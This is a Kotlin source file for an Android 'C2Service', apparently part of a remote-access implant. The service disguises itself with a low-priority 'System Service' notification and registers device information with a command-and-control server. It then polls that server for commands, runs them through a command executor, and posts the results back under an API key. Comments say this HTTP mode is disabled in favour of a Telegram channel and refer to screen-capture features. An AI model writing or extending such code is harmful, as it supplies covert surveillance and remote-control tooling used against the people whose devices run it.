package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Legacy HTTP C2 service. Disabled by default when using Telegram mode.
 * It no longer consumes MediaProjection tokens.
 */
class C2Service : Service() {

    companion object {
        private const val TAG = "C2Service"
        private const val NOTIF_ID = 1
        private const val CHANNEL_ID = "c2"
        private const val ENABLED = false   // ← عطّلناه لأننا في وضع Telegram
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }
    private lateinit var serverUrl: String

    private fun log(msg: String) {
        Log.i(TAG, msg)
        LogBus.append(applicationContext, "C2", msg)
    }

    override fun onCreate() {
        super.onCreate()
        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        if (!ENABLED) {
            log("C2Service disabled (Telegram mode active)")
            stopSelf()
            return
        }
        log("onCreate deviceId=$deviceId")
        serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
            .getString("server_url", BuildConfig.C2_URL)!!
        scope.launch { registerLoop() }
        scope.launch { pollLoop() }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!ENABLED) return START_NOT_STICKY
        // Never touch MediaProjection from here
        return START_STICKY
    }

    private fun startForegroundCompat(type: Int) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            log("startForeground failed: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private suspend fun registerLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val info = DeviceInfo.snapshot(this, deviceId)
                postJson("$serverUrl/api/agent/register", info)
            } catch (e: Exception) {
                log("register failed: ${e.message}")
            }
            delay(30_000)
        }
    }

    private suspend fun pollLoop() {
        while (currentCoroutineContext().isActive) {
            try {
                val body = JSONObject().put("device_id", deviceId)
                val resp = postJson("$serverUrl/api/agent/poll", body)
                val cmds = resp?.optJSONArray("commands") ?: JSONArray()
                for (i in 0 until cmds.length()) {
                    val cmd = cmds.getJSONObject(i)
                    scope.launch { execute(cmd) }
                }
            } catch (e: Exception) {
                log("poll failed: ${e.message}")
            }
            delay(5_000)
        }
    }

    private suspend fun execute(cmd: JSONObject) {
        val id = cmd.getInt("id")
        val type = cmd.getString("type")
        val args = cmd.optJSONObject("args") ?: JSONObject()
        // Screenshot not supported in legacy mode when Telegram handles projection
        val result = try {
            CommandExecutor.run(this, type, args)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "unknown")
        }
        val payload = JSONObject()
            .put("command_id", id)
            .put("device_id", deviceId)
            .put("success", !result.has("error"))
            .put("result", result)
        try { postJson("$serverUrl/api/agent/result", payload) } catch (_: Exception) {}
    }

    private suspend fun postJson(url: String, body: JSONObject): JSONObject? =
        withContext(Dispatchers.IO) {
            val req = Request.Builder()
                .url(url)
                .addHeader("X-Api-Key", BuildConfig.API_KEY)
                .post(body.toString().toRequestBody("application/json".toMediaType()))
                .build()
            val raw = client.newCall(req).execute().use { r -> r.body?.string() }
            if (raw == null) return@withContext null
            try { JSONObject(raw) } catch (_: Exception) { null }   // ← يتجاهل HTML warning
        }

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
